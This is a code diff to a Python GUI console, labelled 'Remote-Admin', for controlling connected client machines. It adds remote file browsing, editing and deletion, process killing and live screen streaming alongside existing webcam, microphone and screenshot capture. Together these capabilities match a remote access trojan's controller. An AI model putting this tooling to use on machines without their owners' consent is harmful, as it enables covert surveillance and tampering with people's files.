@@ -14,8 +14,23 @@ def log_message(message, level="INFO"):
     g.log_message(message, level)
 
 
+# _screen_stream_active is defined near the Live Screen Stream section below
+
+
 def execute_command(cmd, cmd_name):
     """Execute command on active client — runs in background thread."""
+    if _screen_stream_active:
+        g.root.after(0, lambda: messagebox.showwarning("Stream Active", "Please close the Live Screen Monitor window before using other features!"))
+        def _restore_prompt():
+            try:
+                g.terminal_output.insert(tk.END, "\nRemote-Admin> ", "prompt")
+                g.terminal_output.mark_set("input_start", "end-1c")
+                g.terminal_output.see(tk.END)
+            except Exception:
+                pass
+        g.root.after(50, _restore_prompt)
+        return
+
     conn = None
     client_hostname = "Unknown"
     try:
@@ -44,7 +59,7 @@ def execute_command(cmd, cmd_name):
         start_time = time.time()
         last_update = time.time()
 
-        is_special_cmd = cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE"))
+        is_special_cmd = cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "PROCESS_LIST", "SYSTEM_METRICS", "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:", "READ_TEXT_FILE:", "WRITE_TEXT_FILE:"))
         if cmd.upper().startswith("MICROPHONE"):
             try:
                 mic_duration = int(cmd.split(":")[1])
@@ -52,6 +67,9 @@ def execute_command(cmd, cmd_name):
                 mic_duration = 10
             max_timeout = max(30.0, float(mic_duration) + 15.0)
             max_chunks = 2000
+        elif cmd.upper().startswith(("READ_TEXT_FILE:", "WRITE_TEXT_FILE:")):
+            max_timeout = 25.0
+            max_chunks = 1000
         else:
             max_timeout = 15.0 if cmd.upper() in ("SCREENSHOT", "WEBCAM") else 5.0
             if cmd.upper() in ("SCREENSHOT", "WEBCAM"):
@@ -83,8 +101,23 @@ def execute_command(cmd, cmd_name):
                     g.root.after(0, lambda: g.root.update_idletasks())
                     last_update = time.time()
 
-                if b'}' in chunk:
-                    break
+                if is_special_cmd:
+                    # Check if the chunk has a closing brace near the end
+                    stripped_chunk = chunk.rstrip(b'\r\n\t ')
+                    if stripped_chunk.endswith(b'}'):
+                        try:
+                            # Try to parse the accumulated buffer to see if it's a complete JSON
+                            decoded = all_data.decode(errors="ignore")
+                            json_start = decoded.find('{')
+                            json_end = decoded.rfind('}')
+                            if json_start != -1 and json_end != -1 and json_end >= json_start:
+                                json.loads(decoded[json_start:json_end+1])
+                                break
+                        except Exception:
+                            pass
+                else:
+                    if b'\n}' in chunk:
+                        break
 
             except socket.timeout:
                 # Instead of breaking, just continue until max_timeout
@@ -156,6 +189,8 @@ def _handle_special_response(output):
         elif resp_type == "UPLOAD":
             if response.get("status") == "success":
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"✓ {m}\n", "success"))
+                if g.file_manager_window and g.file_manager_window.winfo_exists():
+                    g.root.after(100, lambda: g.file_manager_window.refresh())
             else:
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ {m}\n", "error"))
 
@@ -178,6 +213,75 @@ def _handle_special_response(output):
                 g.root.after(0, lambda d=response.get('duration', 10): g.terminal_output.insert(tk.END, f"✓ Audio recorded ({d}s)\n", "success"))
             else:
                 g.root.after(0, lambda m=response.get('message'): g.terminal_output.insert(tk.END, f"❌ Microphone failed: {m}\n", "error"))
+
+        elif resp_type == "PROCESS_LIST":
+            if response.get("status") == "success":
+                g.root.after(0, lambda: feat.show_task_manager(response.get("data")))
+            else:
+                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Task Manager Error", f"Failed to get process list:\n{m}"))
+
+        elif resp_type == "SYSTEM_METRICS":
+            if response.get("status") == "success":
+                if g.dashboard_window and g.dashboard_window.winfo_exists() and hasattr(g.dashboard_window, 'update_metrics'):
+                    g.root.after(0, lambda: g.dashboard_window.update_metrics(response.get("data")))
+
+        elif resp_type == "KILL_PROCESS":
+            if response.get("status") == "success":
+                g.root.after(0, lambda: messagebox.showinfo("Success", f"Process {response.get('pid')} terminated successfully."))
+                g.root.after(100, lambda: threading.Thread(target=execute_command, args=("PROCESS_LIST", "Get Process List"), daemon=True).start())
+            else:
+                g.root.after(0, lambda m=response.get('message'), p=response.get('pid'): messagebox.showerror("Kill Process Error", f"Failed to kill process {p}:\n{m}"))
+
+        elif resp_type == "FILE_BROWSER":
+            if response.get("status") == "success":
+                if g.file_manager_window and g.file_manager_window.winfo_exists():
+                    import os
+                    def std_path(p):
+                        return os.path.normcase(os.path.abspath(p or ""))
+                    # Only update if it is the response to our last requested path (race condition guard)
+                    last_req = getattr(g.file_manager_window, 'last_requested_path', '')
+                    if not last_req or std_path(response.get("path")) == std_path(last_req):
+                        g.root.after(0, lambda: feat.show_file_manager(response.get("path"), response.get("data")))
+            else:
+                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("File Manager Error", f"Failed to list directory:\n{m}"))
+                if g.file_manager_window and g.file_manager_window.winfo_exists():
+                    g.root.after(0, lambda: g.file_manager_window.enable_controls())
+
+        elif resp_type == "DELETE_FILE":
+            if response.get("status") == "success":
+                g.root.after(0, lambda: messagebox.showinfo("Success", "Deleted successfully."))
+                if g.file_manager_window and g.file_manager_window.winfo_exists():
+                    g.root.after(100, lambda: g.file_manager_window.refresh())
+            else:
+                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Delete Error", f"Failed to delete:\n{m}"))
+
+        elif resp_type == "READ_TEXT_FILE":
+            if response.get("status") == "success":
+                try:
+                    import base64
+                    raw_bytes = base64.b64decode(response.get("content", ""))
+                    content_str = raw_bytes.decode("utf-8")
+                    
+                    if g.file_manager_window and g.file_manager_window.winfo_exists():
+                        g.root.after(0, lambda: g.file_manager_window.enable_controls())
+                        
+                    g.root.after(0, lambda: feat.open_file_editor(response.get("path"), response.get("encoding"), content_str))
+                except Exception as e:
+                    g.root.after(0, lambda err=str(e): messagebox.showerror("Editor Error", f"Failed to decode content:\n{err}"))
+            else:
+                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Editor Error", f"Failed to read file:\n{m}"))
+                if g.file_manager_window and g.file_manager_window.winfo_exists():
+                    g.root.after(0, lambda: g.file_manager_window.enable_controls())
+
+        elif resp_type == "WRITE_TEXT_FILE":
+            if response.get("status") == "success":
+                g.root.after(0, lambda: messagebox.showinfo("Success", "Saved successfully."))
+                if g.file_editor_window and g.file_editor_window.winfo_exists():
+                    g.root.after(0, lambda: g.file_editor_window.on_save_success())
+            else:
+                g.root.after(0, lambda m=response.get('message'): messagebox.showerror("Save Error", f"Failed to save file:\n{m}"))
+                if g.file_editor_window and g.file_editor_window.winfo_exists():
+                    g.root.after(0, lambda: g.file_editor_window.on_save_failed())
 
     except json.JSONDecodeError:
         if output.strip():
@@ -535,3 +639,111 @@ def _cleanup_mic():
         g.root.after(0, lambda: g.terminal_output.insert(tk.END, "🎤 Microphone stream ended\n", "success"))
         g.root.after(0, lambda: g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt"))
         g.root.after(0, lambda: g.terminal_output.mark_set("input_start", "end-1c"))
+
+
+# ── Live Screen Stream ────────────────────────────────────────────────────────
+
+_screen_stream_active = False
+
+def start_screen_stream(frame_callback):
+    """Send LIVE_SCREEN to client, receive screen frames and invoke callback."""
+    global _screen_stream_active
+    _screen_stream_active = True
+
+    conn = None
+    try:
+        with g.clients_lock:
+            if not g.active_client_id or g.active_client_id not in g.clients:
+                g.root.after(0, lambda: log_message("No active client for screen stream", "ERROR"))
+                _cleanup_screen_stream()
+                return
+            conn = g.clients[g.active_client_id]["conn"]
+
+        log_message("Starting Live Screen Stream...", "INFO")
+        conn.send(b"LIVE_SCREEN")
+        conn.settimeout(0.3)
+
+        buf = b""
+        while _screen_stream_active:
+            try:
+                chunk = conn.recv(65536)
+                if not chunk:
+                    break
+                buf += chunk
+                while b"\n[FRAME_END]\n" in buf:
+                    frame_bytes, buf = buf.split(b"\n[FRAME_END]\n", 1)
+                    if frame_bytes:
+                        try:
+                            decoded = frame_bytes.decode(errors="replace").strip()
+                            json_start = decoded.find('{')
+                            json_end = decoded.rfind('}')
+                            if json_start != -1 and json_end != -1:
+                                response = json.loads(decoded[json_start:json_end+1])
+                                if response.get("type") == "LIVE_SCREEN":
+                                    if response.get("status") == "success":
+                                        frame_data = response.get("data")
+                                        res = response.get("resolution", "?")
+                                        g.root.after(0, lambda fd=frame_data, r=res: frame_callback(fd, r))
+                                    else:
+                                        log_message(f"Live Screen Error: {response.get('message')}", "ERROR")
+                        except Exception:
+                            pass
+            except socket.timeout:
+                continue
+            except (OSError, ConnectionError):
+                break
+    except Exception as e:
+        log_message(f"Screen stream error: {e}", "ERROR")
+    finally:
+        if conn:
+            try:
+                # Wait 200ms for client to process LIVE_SCREEN_STOP and stop sending
+                time.sleep(0.2)
+                # Flush leftover packets in the socket buffer
+                old_timeout = conn.gettimeout()
+                conn.settimeout(0.0)
+                try:
+                    while True:
+                        if not conn.recv(65536):
+                            break
+                except (BlockingIOError, socket.error):
+                    pass
+                finally:
+                    conn.settimeout(1.0)
+            except Exception as fe:
+                log_message(f"Error flushing socket: {fe}", "WARNING")
+        _cleanup_screen_stream()
+
+def stop_screen_stream():
+    """Send LIVE_SCREEN_STOP to client to end the live stream."""
+    global _screen_stream_active
+    _screen_stream_active = False
+    try:
+        with g.clients_lock:
+            if g.active_client_id and g.active_client_id in g.clients:
+                conn = g.clients[g.active_client_id]["conn"]
+                try:
+                    conn.send(b"LIVE_SCREEN_STOP")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    _cleanup_screen_stream()
+
+def _cleanup_screen_stream():
+    global _screen_stream_active
+    _screen_stream_active = False
+    
+    # Restore screen stream button status if any reference exists
+    btn = getattr(g, 'screen_monitor_button', None)
+    if btn:
+        g.root.after(0, lambda: btn.config(text="🖥️ Screen Stream", bg="#3949AB"))
+
+    def _restore_prompt():
+        try:
+            g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
+            g.terminal_output.mark_set("input_start", "end-1c")
+            g.terminal_output.see(tk.END)
+        except Exception:
+            pass
+    g.root.after(50, _restore_prompt)
